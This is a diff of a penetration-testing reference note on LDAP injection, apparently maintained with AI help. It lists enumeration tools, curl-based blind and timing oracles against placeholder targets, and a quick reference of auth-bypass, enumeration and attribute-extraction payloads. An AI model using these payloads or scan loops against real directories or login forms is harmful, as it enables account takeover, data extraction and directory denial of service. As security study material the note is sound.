@@ -1,12 +1,10 @@
 # LDAP Injection
 
-#LDAPi #Injection #WebAppAttacks #ActiveDirectory
-
+#LDAPi #Injection #WebAppAttacks #ActiveDirectory #AuthBypass #BlindInjection #ldapsearch #windapsearch #BurpSuite
 
 ## What is this?
 
 LDAP query injection via unsanitized input — enables auth bypass, attribute enumeration, and blind data extraction. Common in directory-integrated apps. Pairs with [[SQL Injection]], [[Web Attacks]].
-
 
 ---
 
@@ -14,12 +12,12 @@ LDAP query injection via unsanitized input — enables auth bypass, attribute en
 
 | Tool | Purpose |
 |---|---|
-| `Burp Suite` | Intercept login requests, inject LDAP payloads, Intruder with SecLists LDAP wordlist |
-| `ldapsearch` | Manual enumeration and auth bypass testing — `ldapsearch -x -H ldap://<target> -b "dc=target,dc=com" "(objectClass=*)"` |
-| `ldapdomaindump` | Enumerate AD over LDAP and output HTML/JSON — `ldapdomaindump -u 'domain\user' -p 'pass' <dc-ip>` |
-| `Metasploit` | `auxiliary/scanner/ldap/ldap_login` for credential brute-force |
-| `windapsearch` | LDAP-based AD enumeration — users, groups, computers, DAs — `git clone https://github.com/ropnop/windapsearch` (run `./windapsearch.py --dc-ip <ip> …`) |
-| SecLists | LDAP injection strings — `/usr/share/seclists/Fuzzing/LDAP.Fuzzing.txt` |
+| [[Tools/Web/Burpsuite\|Burp Suite]] | Intercept login requests, inject LDAP payloads, Intruder with SecLists LDAP wordlist |
+| [[Tools/AD/ldapsearch\|ldapsearch]] | Manual enumeration and auth bypass testing |
+| [[Tools/AD/ldapdomaindump\|ldapdomaindump]] | Enumerate AD over LDAP and output HTML/JSON |
+| [[Tools/Payloads & Shells/metasploit\|Metasploit]] | `auxiliary/scanner/ldap/ldap_login` for credential brute-force |
+| [[Tools/AD/windapsearch\|windapsearch]] | LDAP-based AD enumeration — users, groups, computers, DAs |
+| [[Tools/Wordlists/seclist\|SecLists]] | LDAP injection strings — `/usr/share/seclists/Fuzzing/LDAP.Fuzzing.txt` |
 
 ---
 
@@ -202,7 +200,7 @@ EOF
 ## OOB / Blind Extraction via Error Differences
 
 ```bash
-# Time-based isn't common in LDAP — use response differences:
+# Response differences are the primary oracle:
 # - Login success vs failure
 # - Page content length difference
 # - HTTP redirect vs no redirect
@@ -214,6 +212,29 @@ curl -s -X POST "http://<target>/login" --data-urlencode "username=admin" --data
 curl -s -X POST "http://<target>/login" --data-urlencode "username=doesnotexist12345" --data-urlencode "password=*" | wc -c
 # Size difference = user exists check
 ```
+
+### Timing as a Fallback Oracle
+
+When responses are byte-identical regardless of match, force the directory to do expensive work and measure. AD in particular shows measurable differences on filters that require scanning large result sets or evaluating unindexed attributes.
+
+```bash
+# Cheap filter (indexed, narrow) vs expensive filter (unindexed substring over everything)
+# Baseline:
+time curl -s -o /dev/null -X POST "http://<target>/login" \
+  --data-urlencode "username=admin" --data-urlencode "password=*"
+
+# Force a full scan — unindexed attribute with a leading wildcard
+time curl -s -o /dev/null -X POST "http://<target>/login" \
+  --data-urlencode "username=admin)(description=*a*" --data-urlencode "password=*"
+
+# Repeat each 5-10x and compare medians — single samples are noise
+for i in $(seq 1 10); do
+  curl -s -o /dev/null -w "%{time_total}\n" -X POST "http://<target>/login" \
+    --data-urlencode "username=admin)(description=*a*" --data-urlencode "password=*"
+done | sort -n | awk '{a[NR]=$1} END{print "median:", a[int(NR/2)+1]}'
+```
+
+> [!warning] Forcing full-directory scans in a loop is effectively load-testing the DC — CVE-2025-12764 (pgAdmin) was exactly this pattern weaponized into DoS with cascading auth failures. Rate-limit it, keep the sample count low, and don't run it against a production directory without clearing it first.
 
 ---
 
@@ -264,7 +285,6 @@ curl -s --data-urlencode "search=)(|(uid=*" "http://<target>/search"
 curl -s --data-urlencode "search=*)(|(memberOf=CN=Admins,DC=corp,DC=local" "http://<target>/search"
 ```
 
-
 ---
 
 ## Active Directory LDAP Specifics
@@ -310,6 +330,8 @@ git clone https://github.com/ropnop/windapsearch && cd windapsearch
 ./windapsearch.py --dc-ip <dc-ip> -d <domain> -u <user>@<domain> -p <pass> --custom "(&(objectClass=user)(servicePrincipalName=*))"
 ```
 
+---
+
 ## Operational Attributes — Attack Planning Data
 
 ```bash
@@ -344,19 +366,24 @@ ldapsearch -x -H ldap://<dc-ip> -D "<user>@<domain>" -w "<pass>" \
 
 ## Quick Reference
 
+> [!warning] Every username-field payload below is paired with **`password=*`**. That pairing is not optional — the injected filter has to stay paren-balanced *and* neutralize the `(password=...)` clause, or it stays ANDed and the login fails on a match. See [[#Authentication Bypass]] for the payloads that look right but don't work.
+
 ```bash
-# Auth bypass payloads (username field)
-admin)(&            # close + always-true
-*)(&                # wildcard + always-true
-*                   # match any user
+# Auth bypass — username field  (send password=* with each)
+*)(|(uid=*          # close uid, OR-in always-true, swallow password clause
+*                   # match any user (needs a set password attribute)
+admin)(uid=*))%00   # NUL-truncate the password clause off entirely
 
-# Auth bypass (password field)
-*                   # match any password
-*)(&                # close + always-true
+# Auth bypass — password field  (username = a known/guessed user)
+*                   # match any set password value
+*)(&                # close password, append empty AND(true)
 
-# Enumerate via wildcard
-a*)(&               # users starting with 'a'
-*admin*)(&          # users containing 'admin'
+# Enumerate via wildcard  (again, password=*)
+a*                  # users starting with 'a'
+*admin*             # users containing 'admin'
+
+# Attribute extraction — username field, password=*
+admin)(mail=a*      # does admin's mail start with 'a'?
 
 # LDAP injection fuzz list
 /usr/share/seclists/Fuzzing/LDAP.Fuzzing.txt
@@ -365,5 +392,5 @@ a*)(&               # users starting with 'a'
 ---
 
 *Created: 2026-03-04*
-*Updated: 2026-07-21*
-*Model: claude-sonnet-4-6*
+*Updated: 2026-07-30*
+*Model: claude-opus-5*
